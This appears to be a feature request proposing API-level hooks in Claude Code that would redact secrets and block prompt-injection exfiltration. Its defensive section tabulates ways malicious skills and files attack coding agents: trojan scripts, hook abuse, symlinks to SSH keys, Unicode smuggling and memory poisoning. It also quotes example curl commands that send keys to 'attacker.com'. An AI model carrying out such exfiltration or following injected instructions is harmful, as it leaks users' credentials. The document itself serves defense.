# Feature Request: PreApiCall / PostApiCall hooks to prevent secret exfiltration

## Problem

When using Claude Code, sensitive data can leave the user's machine through **two channels**:

### 1. Data sent to the LLM provider (Anthropic API)

All code, file contents, command outputs, and user prompts are sent to the API. This includes:
- API keys and credentials embedded in configuration files
- Internal project and company names under NDA
- Employee names and email addresses (PII/GDPR)
- Internal hostnames, IPs, and infrastructure details
- Proprietary business logic and trade secrets

Even when the API provider is trusted, enterprise data governance policies may require that certain data **never leaves the machine** regardless of destination.

### 2. Data exfiltrated to attackers via prompt injection

A malicious file, skill, or MCP tool can inject instructions that cause Claude to exfiltrate secrets to third-party servers. This is a real and documented attack vector — see the "Defense against prompt injection exfiltration" section below for specific techniques with success rates up to 100%.

**The core need**: Organizations need the ability to **prevent sensitive data from leaving the machine through any channel** — whether to the API provider or to an attacker.

### Why existing hooks are insufficient

The current hook system operates at the **tool level**, which creates fundamental gaps:

| Hook | Can modify input? | Can modify output? |
|------|------------------|-------------------|
| PreToolUse | Yes (`updatedInput`) | N/A |
| **PostToolUse** | N/A | **No** (block only) |
| **UserPromptSubmit** | **No** (block only) | N/A |

Because **PostToolUse cannot modify tool output**, there is no way to redact secrets from:
- `Read` tool results (file contents sent to the LLM)
- `Grep` search results
- `Bash` command output
- `Glob` file listings
- `WebFetch` responses
- Any future tool or MCP tool output

The only workarounds today are:
- **Shadow files**: Intercept `Read` in PreToolUse, create a redacted copy, redirect `file_path` via `updatedInput` — fragile, requires per-tool handling
- **Command wrapping**: Intercept `Bash` in PreToolUse, wrap commands with a proxy that redacts stdout — adds latency, shell quoting issues
- **Blocking**: Block tools entirely when sensitive content is detected — breaks the workflow
- **API proxy via `ANTHROPIC_BASE_URL`**: Run a local HTTP proxy — works but requires a daemon process, SSE streaming handling, and TLS management

Each workaround requires tool-specific code, and none provide complete coverage. New tools or MCP servers automatically create new gaps.

## Proposed Solution

Add two new hook events that fire at the **API request/response level**:

### `PreApiCall`

Fires **before** the Messages API request is sent to the upstream provider. The hook receives the full request body and can modify it.

**Use case**: Scan all `content` blocks (user messages, tool results, system prompts) and redact sensitive values before they leave the machine.

```json
{
  "hooks": {
    "PreApiCall": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "my-redaction-tool --redact"
          }
        ]
      }
    ]
  }
}
```

**Hook input** (stdin):
```json
{
  "hook_event_name": "PreApiCall",
  "session_id": "...",
  "request": {
    "method": "POST",
    "url": "/v1/messages",
    "body": {
      "model": "claude-sonnet-4-20250514",
      "messages": [
        {"role": "user", "content": "Check the config for AcmeCorp"},
        {"role": "assistant", "content": "...", "tool_use": [...]},
        {"role": "user", "content": [
          {"type": "tool_result", "content": "api_key = sk-secret123..."}
        ]}
      ],
      "system": "..."
    }
  }
}
```

**Hook output** (stdout):
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreApiCall",
    "updatedBody": {
      "messages": [
        {"role": "user", "content": "Check the config for __REDACTED_PROJECT_a1b2__"},
        {"role": "assistant", "content": "...", "tool_use": [...]},
        {"role": "user", "content": [
          {"type": "tool_result", "content": "api_key = __REDACTED_KEY_c3d4__"}
        ]}
      ]
    }
  }
}
```

### `PostApiCall`

Fires **after** the API response is received (or after the full stream is collected). The hook receives the response and can modify it before Claude Code processes it.

**Use case**: Un-redact tokens in Claude's response so the user sees real values in the terminal, and tool calls execute with real content.

```json
{
  "hooks": {
    "PostApiCall": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "my-redaction-tool --unredact"
          }
        ]
      }
    ]
  }
}
```

**Hook input** (stdin):
```json
{
  "hook_event_name": "PostApiCall",
  "session_id": "...",
  "response": {
    "content": [
      {"type": "text", "text": "I found __REDACTED_KEY_c3d4__ in the config..."},
      {"type": "tool_use", "name": "Write", "input": {
        "file_path": "config.py",
        "content": "key = __REDACTED_KEY_c3d4__"
      }}
    ]
  }
}
```

**Hook output** (stdout):
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PostApiCall",
    "updatedResponse": {
      "content": [
        {"type": "text", "text": "I found sk-secret123... in the config..."},
        {"type": "tool_use", "name": "Write", "input": {
          "file_path": "config.py",
          "content": "key = sk-secret123..."
        }}
      ]
    }
  }
}
```

## How it works end-to-end

```
1. User: "Read config.py and update the API key"
2. Claude Code calls Read tool → gets file with real secret
3. Claude Code builds API request with tool_result containing the secret
4. ✨ PreApiCall hook fires → redacts "sk-secret123" → "__REDACTED_KEY_c3d4__"
5. Redacted request sent to Anthropic API
6. Claude responds using redacted token: "I'll update __REDACTED_KEY_c3d4__..."
7. ✨ PostApiCall hook fires → un-redacts "__REDACTED_KEY_c3d4__" → "sk-secret123"
8. Claude Code sees real values → tool calls execute with real content
9. User sees real values in terminal
10. Secret never left the machine
```

## Why this is better than per-tool hooks

| Aspect | Per-tool hooks (today) | API-level hooks (proposed) |
|--------|----------------------|---------------------------|
| Coverage | Per-tool, gaps for new tools | **All content, zero gaps** |
| Tool output redaction | Cannot modify (PostToolUse limitation) | **Full modification** |
| Prompt redaction | Cannot modify (UserPromptSubmit limitation) | **Full modification** |
| Implementation complexity | Per-tool handling, shadow files, command wrapping | **One hook, one pass** |
| Future-proof | New tools create new gaps | **Automatically covers all tools** |
| MCP tools | No output modification | **Covered** |

## Streaming consideration

For streaming responses, two options:

1. **Buffer mode**: Collect the full response, run the hook, then deliver to Claude Code. Adds latency but simplest implementation.
2. **Chunk mode**: Fire the hook on each SSE chunk. Lower latency but requires the hook to handle partial tokens. Could offer both modes via configuration.

Buffer mode is acceptable for a first implementation — the hook runs locally so latency is minimal (milliseconds).

## Use cases beyond secret redaction

These hooks would enable many enterprise use cases:

- **Compliance logging**: Log all data sent to external APIs for audit trails
- **PII stripping**: Remove personal data before it reaches any LLM provider
- **Content filtering**: Block or modify certain content categories
- **Cost monitoring**: Inspect request sizes before they're sent
- **Custom routing**: Route requests to different providers based on content
- **Data loss prevention (DLP)**: Integrate with enterprise DLP systems

## Defense against prompt injection exfiltration

Beyond protecting data sent to the LLM provider, API-level hooks would also help defend against **prompt injection attacks that trick the model into exfiltrating secrets via tool calls**.

### The threat

A malicious file, skill, or MCP tool can inject instructions that cause Claude to exfiltrate sensitive data. Real-world attack vectors include (see [gricha/dangerous-skills](https://github.com/gricha/dangerous-skills) for educational examples):

| Attack | Vector | How it exfiltrates |
|--------|--------|-------------------|
| **Trojan script** | Skill bundles a bash script with payload buried in 60 lines of real code | Agent runs the script, payload executes |
| **Hook exploitation** | Skill defines PostToolUse hooks in YAML frontmatter | Shell command fires on every Edit/Bash — model never knows |
| **Test file RCE** | Skill bundles a `conftest.py` auto-imported by pytest | `pytest` discovery executes arbitrary Python |
| **Symlink exfiltration** | "Example" file is symlink to `~/.ssh/id_rsa` | Agent reads "example," actually reads real private key |
| **Supply chain** | Local npm package with `postinstall` hook | `npm install` triggers arbitrary Node.js |
| **Image injection** | PNG badge with near-invisible prompt injection text | Multimodal LLM reads hidden instructions |
| **Unicode smuggling** | Invisible Unicode tag characters in markdown | LLM reads instructions humans can't see |
| **Memory poisoning** | Skill modifies `~/.claude/CLAUDE.md` with persistent backdoor | Every future session runs the trojan — survives skill removal |
| **Pre-prompt injection** | `!`command`` syntax runs shell at template expansion time | Model never sees the command, can't prevent it |

### How PreApiCall helps

With a `PreApiCall` hook, a redaction tool can scan the **entire outgoing request** — all messages, tool results, system prompts — and:

1. **Detect secrets** that shouldn't be leaving the machine (API keys, SSH keys, credentials)
2. **Block or redact** before the data reaches any external server
3. **Detect exfiltration patterns** like `curl attacker.com | base64-encoded-data`
4. **Log all outgoing data** for compliance audit

This is strictly more powerful than per-tool PreToolUse hooks because it covers everything at once — including tool results, system context, and content injected via skills/hooks/`!`command`` that per-tool hooks never see.

### How PostApiCall helps for defense

When the LLM responds with tool calls that might exfiltrate data (e.g., `Bash("curl attacker.com/steal?key=sk-...")"`), a `PostApiCall` hook can scan the response and:

1. **Strip or block** tool calls containing sensitive patterns
2. **Alert the user** to potential exfiltration attempts
3. **Log suspicious responses** for security review

This catches prompt-injection-driven exfiltration before the tool call reaches execution — even if PreToolUse hooks exist, having the defense at the API response level provides defense-in-depth.

## Summary

Adding `PreApiCall` and `PostApiCall` hooks would:

1. **Close the fundamental gap** where tool output and user prompts cannot be modified by existing hooks
2. **Enable enterprise secret redaction** with zero coverage gaps — no per-tool workarounds needed
3. **Defend against prompt injection exfiltration** — scan all outgoing data and incoming tool calls
4. **Future-proof** against new tools, MCP servers, and attack vectors
5. **Unlock enterprise use cases** (compliance, DLP, PII stripping, audit logging)
6. **Provide defense-in-depth** complementing existing PreToolUse/PostToolUse hooks

This is the missing piece that would make Claude Code fully viable for environments with strict data governance and security requirements.
